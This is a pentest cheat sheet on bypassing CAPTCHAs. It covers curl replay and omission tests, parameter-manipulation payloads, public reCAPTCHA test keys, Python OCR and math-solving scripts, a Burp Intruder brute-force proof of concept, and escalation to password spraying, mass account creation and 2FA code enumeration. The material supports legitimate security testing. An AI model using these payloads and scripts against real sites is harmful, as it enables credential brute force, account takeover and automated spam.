# CAPTCHA Bypass

> **Summary**: Exploitation of flaws in CAPTCHA implementation to automate actions that should require human verification, enabling brute force, credential stuffing, and automated abuse.
> **Impact**: Brute-force attacks on login/registration, mass account creation, automated spam submission, rate limit circumvention.
> **Typical Severity**: Medium | Low (depends on what the CAPTCHA protects)

---

## Detection

### Indicators
- CAPTCHA tokens that are reusable across multiple requests
- CAPTCHA validation occurs client-side only
- CAPTCHA parameter can be omitted from the request without causing rejection
- CAPTCHA value is leaked in page source, cookies, or response headers
- No server-side session binding between CAPTCHA challenge and solution
- Static or low-entropy CAPTCHA image sets

### Automated Detection
```bash
# Test if CAPTCHA parameter can be removed entirely
# Replay the request without the captcha field
curl -X POST "https://<TARGET>/login" \
  -d "username=admin&password=test123" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Test if empty CAPTCHA value is accepted
curl -X POST "https://<TARGET>/login" \
  -d "username=admin&password=test123&captcha=" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Test CAPTCHA token reuse - send same token multiple times
for i in $(seq 1 10); do
  curl -X POST "https://<TARGET>/login" \
    -d "username=admin&password=pass${i}&captcha=<SOLVED_TOKEN>" \
    -b "session=<SESSION_COOKIE>"
done
```

### Manual Detection
1. Solve a CAPTCHA and capture the full request in Burp Suite
2. Replay the same request with the same CAPTCHA token -- check if it is accepted again
3. Remove the CAPTCHA parameter entirely and re-send -- check if the request succeeds
4. Send an empty CAPTCHA value -- check for acceptance
5. Switch HTTP method (POST to GET or vice versa) -- check if CAPTCHA is still enforced
6. Inspect page source and cookies for the CAPTCHA answer in plaintext or encoded form

---

## Exploitation

### Prerequisites
- Application uses CAPTCHA to protect a sensitive action (login, registration, form submission)
- CAPTCHA implementation has one or more of the bypass flaws listed below

### Step-by-Step

1. **Parameter removal** -- remove the CAPTCHA field from the request entirely
   - Success: server processes the request without CAPTCHA validation
2. **Empty value** -- submit the CAPTCHA field with an empty value
   - Success: server accepts the empty CAPTCHA and processes the request
3. **Token reuse** -- solve the CAPTCHA once, then replay the token across multiple requests
   - Success: server accepts the same token on subsequent requests
4. **Source code inspection** -- search the HTML source, JavaScript, and cookies for the CAPTCHA answer
   - Success: CAPTCHA solution is found in a hidden field, cookie, or API response
5. **HTTP method change** -- change from POST to GET (or PUT, PATCH, etc.)
   - Success: alternate method bypasses CAPTCHA check entirely
6. **Session manipulation** -- reuse a session where CAPTCHA was already solved
   - Success: CAPTCHA is validated once per session, not per request
7. **OCR automation** -- use optical character recognition on image CAPTCHAs
   - Success: automated solving achieves high accuracy on simple CAPTCHAs

### Payloads

#### Parameter Manipulation
```
# Original request
username=admin&password=test123&captcha=abc123

# Remove CAPTCHA parameter
username=admin&password=test123

# Empty CAPTCHA
username=admin&password=test123&captcha=

# CAPTCHA set to null/zero
username=admin&password=test123&captcha=null
username=admin&password=test123&captcha=0
username=admin&password=test123&captcha=undefined

# Change data format (form data to JSON)
{"username":"admin","password":"test123"}
```

#### reCAPTCHA Bypass Techniques
```
# Test if g-recaptcha-response can be empty
g-recaptcha-response=

# Test with static/hardcoded test keys (Google test keys)
# Site key: 6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI
# Secret key: 6LeIxAcTAAAAAGG-vFI1TnRWxMZNFuojJ4WifJWe
# These always pass validation -- check if the application uses them in production

# Replay a previously valid reCAPTCHA token
g-recaptcha-response=<PREVIOUSLY_SOLVED_TOKEN>
```

#### OCR-Based Solving
```python
# Python + Tesseract OCR for simple image CAPTCHAs
import pytesseract
from PIL import Image
import requests
from io import BytesIO

response = requests.get("https://<TARGET>/captcha/image")
img = Image.open(BytesIO(response.content))
captcha_text = pytesseract.image_to_string(img, config='--psm 7 -c tessedit_char_whitelist=0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz')
print(f"Solved: {captcha_text.strip()}")
```

#### Math-Based CAPTCHA Automation
```python
# If CAPTCHA is a math problem (e.g., "What is 5 + 3?")
import re

captcha_text = "What is 5 + 3?"
match = re.search(r'(\d+)\s*([+\-*/])\s*(\d+)', captcha_text)
if match:
    result = eval(f"{match.group(1)}{match.group(2)}{match.group(3)}")
    print(f"Answer: {result}")
```

### Proof of Concept
1. Navigate to login page and capture the login POST request in Burp Suite
2. Right-click the request and send to Intruder
3. Remove or empty the CAPTCHA parameter
4. Run a password brute-force attack without valid CAPTCHA values
5. If login attempts are processed, CAPTCHA is bypassed

---

## Bypasses

- **Omit parameter**: remove the CAPTCHA field from the request body
- **Empty value**: send `captcha=` (empty string)
- **Token reuse**: replay a previously valid CAPTCHA token
- **Method switching**: change POST to GET, PUT, or PATCH
- **Data format change**: switch from form-urlencoded to JSON (or multipart)
- **API endpoint**: use the mobile/API endpoint that may lack CAPTCHA checks
- **Session persistence**: solve once, then reuse the session for multiple requests
- **Rate limit evasion**: rotate IPs or sessions to reset CAPTCHA enforcement (see [rate-limit-bypass.md](rate-limit-bypass.md))
- **JavaScript disabled**: CAPTCHA rendering depends on JS; test with JS-disabled requests
- **Audio CAPTCHA**: use speech-to-text services on the audio alternative
- **Cookie manipulation**: CAPTCHA state stored in cookies can be modified or replayed

---

## Escalation

- **Brute-force credentials**: bypass CAPTCHA on login to enable password spraying
- **Mass account creation**: automate registration for spam accounts (see [registration-vulns.md](../authentication/registration-vulns.md))
- **2FA brute-force**: bypass CAPTCHA on 2FA verification to enumerate codes (see [2fa.md](../authentication/2fa.md))
- **Automated abuse**: submit unlimited forms (reviews, comments, votes, reports)
- **Rate limit circumvention**: combine with rate-limit bypass for amplified attacks (see [rate-limit-bypass.md](rate-limit-bypass.md))

---

## Tools

| Tool | Usage |
|------|-------|
| Burp Suite | Intercept, modify, and replay CAPTCHA-protected requests |
| Tesseract OCR | Open-source OCR for solving image CAPTCHAs (`pytesseract`) |
| CapSolver | Commercial CAPTCHA-solving API (reCAPTCHA, hCaptcha, etc.) |
| 2Captcha | CAPTCHA-solving service with API integration |
| Anti-Captcha | Automated CAPTCHA solving via human workers or AI |
| Hydra | Brute-force with custom CAPTCHA handling scripts |
| Selenium | Browser automation for CAPTCHA interaction workflows |

---

## References

- https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks
- https://book.hacktricks.xyz/pentesting-web/captcha-bypass
- https://www.hacker101.com/sessions/captcha
- [rate-limit-bypass.md](rate-limit-bypass.md) | [registration-vulns.md](../authentication/registration-vulns.md) | [2fa.md](../authentication/2fa.md)
